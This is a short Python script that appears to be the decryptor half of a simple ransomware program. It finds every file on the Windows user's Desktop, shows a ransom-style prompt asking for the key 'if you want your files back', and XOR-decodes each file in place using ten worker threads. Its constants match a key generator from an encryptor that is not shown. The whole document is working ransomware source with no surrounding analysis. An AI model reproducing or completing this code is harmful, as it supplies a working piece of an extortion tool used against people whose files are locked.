import os
import threading
import queue


def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                # Increment key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} successfully decrypted!!!')
        except:
            print('failed to decrypt file :(')
        q.task_done()

# Encryption information
ENCRYPTION_LEVEL = 512 // 8         # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghiJklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_char_pool_ten = len(key_char_pool)


# grab filepaths to decrypt
print("Preparing files...")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print("successfully located all files!")

key = input("Please enter the decryption key if you want your files back!")

#setup queue with jobs for threads to decrypt
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Setup threads to get ready for decryption
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Decryption is completed!!!')
input()